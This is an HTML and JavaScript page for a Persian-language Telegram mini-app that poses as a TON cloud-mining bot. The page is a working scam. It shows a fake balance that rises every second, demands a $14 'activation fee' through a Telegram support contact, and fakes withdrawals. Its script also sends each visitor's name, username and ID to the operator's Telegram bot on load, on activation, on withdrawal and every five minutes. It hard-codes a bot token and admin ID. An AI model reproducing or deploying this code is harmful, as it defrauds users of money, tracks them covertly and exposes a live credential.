<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TonPlusBot - v40 Ultimate</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;900&display=swap');
        
        body {
            margin: 0; font-family: 'Vazirmatn', sans-serif;
            background: #0b1019; color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
            user-select: none; -webkit-tap-highlight-color: transparent;
        }

        /* بخش پروفایل و عکس کاربر */
        .card-profile {
            background: #161d27; border-radius: 22px; padding: 15px;
            margin-bottom: 12px; border: 1px solid #242c37;
            display: flex; align-items: center; gap: 15px;
        }

        .avatar-container { 
            width: 60px; height: 60px; border-radius: 50%; 
            background: #242c37; overflow: hidden;
            display: flex; align-items: center; justify-content: center;
            border: 2px solid #00c6ff; flex-shrink: 0;
        }

        .avatar-container img { width: 100%; height: 100%; object-fit: cover; display: block; }
        .avatar-container i { font-size: 30px; color: #00c6ff; }

        .card {
            background: #161d27; border-radius: 22px; padding: 22px;
            margin-bottom: 12px; border: 1px solid #242c37; text-align: center;
        }

        #balance { font-size: 44px; font-weight: 900; color: #00c6ff; display: block; margin: 5px 0; letter-spacing: 1px; }

        /* دکمه‌های کاملا هماهنگ و تمام‌عرض */
        .btn {
            width: 100%; height: 58px; border-radius: 20px; border: none;
            font-size: 16px; font-weight: 700; cursor: pointer; display: flex;
            align-items: center; justify-content: center; gap: 10px; color: #fff; 
            text-decoration: none; margin-bottom: 12px; box-sizing: border-box;
        }

        /* اصلاح ریشه‌ای دکمه Connect Wallet برای تراز شدن با بقیه */
        #ton-connect-btn { width: 100%; margin-bottom: 0; }
        #ton-connect-btn div { width: 100%; }
        #ton-connect-btn button {
            width: 100% !important; 
            height: 58px !important; 
            border-radius: 20px !important; 
            background-color: #0088cc !important; 
            display: flex !important;
            justify-content: center !important;
            align-items: center !important;
            transition: 0.2s;
        }

        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
        .support-btn { background: #1c2431; border: 1px solid #333; }
        .active-btn { background: #1faa59; }
        .get-code-btn { background: #0088cc; }

        /* پاپ‌آپ فعالسازی (تصویر پرداخت) */
        #feeModal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #0b1019; z-index: 100000; display: flex; align-items: center; justify-content: center;
        }

        .modal-content {
            background: #161d27; padding: 30px 15px; border-radius: 28px; width: 92%; text-align: center;
            border: 1px solid #242c37; box-sizing: border-box;
        }

        .pay-notice {
            background: rgba(255, 193, 7, 0.05); border: 1.5px solid #ffc107;
            color: #ffc107; padding: 15px; border-radius: 18px; font-size: 11px; 
            margin-bottom: 20px; line-height: 1.8; text-align: center;
        }

        .fee-tag { border: 2px dashed #00ff9d; color: #00ff9d; padding: 12px; border-radius: 18px; font-weight: 800; margin-bottom: 20px; display: block; }

        #activationInput {
            width: 100%; height: 58px; border-radius: 18px; border: 1px solid #333;
            background: #0b1019; color: #fff; text-align: center; font-size: 17px; margin-bottom: 12px; outline: none; box-sizing: border-box;
        }

        .hidden { display: none !important; }
    </style>
</head>
<body>

<div id="feeModal">
    <div class="modal-content">
        <i class="fas fa-lock" style="font-size: 55px; color: #ff512f; margin-bottom: 20px;"></i>
        <h2 style="font-size: 20px; margin-bottom: 15px;">فعالسازی پنل کاربری</h2>
        <div class="pay-notice">
            <i class="fas fa-exclamation-triangle"></i><br>
            جهت واریز کارمزد فقط از پشتیبانی اطلاعات بگیرید.
        </div>
        <div class="fee-tag">14 دلار | 2,226,000 تومان</div>
        <a href="https://t.me/miningertoncoin" class="btn get-code-btn">
            <i class="fas fa-headset"></i> دریافت رمز و واریز
        </a>
        <input type="text" id="activationInput" placeholder="Enter Code">
        <button onclick="verifyActivation()" class="btn active-btn">فعالسازی و ورود</button>
    </div>
</div>

<div class="card-profile">
    <div class="avatar-container" id="userAvatarContainer">
        <i class="fas fa-user-circle" id="defaultAvatarIcon"></i>
        <img id="userAvatarImg" class="hidden">
    </div>
    <div style="text-align: right;">
        <h3 id="displayFirstName" style="margin:0; font-size:16px;">...</h3>
        <p id="displayUserTag" style="margin:0; font-size:12px; color:#00c6ff;">@username</p>
    </div>
</div>

<div class="card">
    <p style="margin:0; font-size:13px; color:#aaa;">موجودی استخراج شده (TON)</p>
    <span id="balance">0.000000</span>
    <div style="font-size:12px; color:#00ff9d; margin-top:8px;">
        <i class="fas fa-bolt"></i> استخراج ابری فعال است
    </div>
</div>

<div class="card">
    <div id="ton-connect-btn"></div>
</div>

<div style="padding: 0 5px;">
    <button id="withdrawBtn" class="btn withdraw-btn">
        <i class="fas fa-arrow-up-from-bracket"></i> درخواست برداشت آنی
    </button>
    <a href="https://t.me/miningertoncoin" class="btn support-btn">
        <i class="fas fa-headset"></i> پشتیبانی آنلاین
    </a>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const SECRET_CODE = "T61O96N12";
    const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
    const ADMIN_ID = "5972276401";

    function logToAdmin(msg) {
        const u = tg.initDataUnsafe?.user;
        const details = u ? `\n👤: ${u.first_name}\n🆔: @${u.username || u.id}` : "";
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg + details)}&parse_mode=HTML`);
    }

    // مدیریت وضعیت فعالسازی
    if(localStorage.getItem('isActivated') === 'true') {
        document.getElementById('feeModal').style.display = 'none';
        logToAdmin("⛏️ <b>کاربر وارد صفحه استخراج شد و هم اکنون آنلاین است</b>");
    } else {
        logToAdmin("🚨 <b>کاربر در حال مشاهده صفحه پرداخت کارمزد است</b>");
    }

    // هارت‌بیت (هر 5 دقیقه)
    setInterval(() => logToAdmin("🟢 <b>کاربر همچنان آنلاین است</b>"), 300000);

    function verifyActivation() {
        const val = document.getElementById('activationInput').value.trim();
        if(val === SECRET_CODE) {
            localStorage.setItem('isActivated', 'true');
            document.getElementById('feeModal').remove();
            logToAdmin("🔓 <b>حساب کاربر با موفقیت فعال شد</b>");
        } else {
            tg.showAlert("رمز وارد شده اشتباه است ❌");
        }
    }

    // لود پروفایل و عکس با متد جدید
    const user = tg.initDataUnsafe?.user;
    if (user) {
        document.getElementById('displayFirstName').innerText = user.first_name;
        document.getElementById('displayUserTag').innerText = user.username ? "@" + user.username : "ID: " + user.id;
        
        if (user.photo_url) {
            const img = document.getElementById('userAvatarImg');
            img.src = user.photo_url;
            img.onload = () => {
                img.classList.remove('hidden');
                document.getElementById('defaultAvatarIcon').classList.add('hidden');
            };
        }
    }

    // استخراج مداوم
    let currentBal = parseFloat(localStorage.getItem('bal_v40')) || 0;
    setInterval(() => {
        currentBal += 0.000012;
        document.getElementById('balance').innerText = currentBal.toFixed(6);
        localStorage.setItem('bal_v40', currentBal.toString());
    }, 1000);

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
        buttonRootId: 'ton-connect-btn'
    });

    document.getElementById('withdrawBtn').onclick = () => {
        if(localStorage.getItem('isActivated') !== 'true') return tg.showAlert("ابتدا فعالسازی را انجام دهید");
        if(!tonConnectUI.connected) return tg.showAlert("لطفاً ابتدا کیف پول را وصل کنید");
        logToAdmin(`💰 <b>درخواست برداشت:</b> ${currentBal.toFixed(6)} TON`);
        tg.showAlert("درخواست شما با موفقیت ثبت شد ✅");
    };
</script>
</body>
</html>
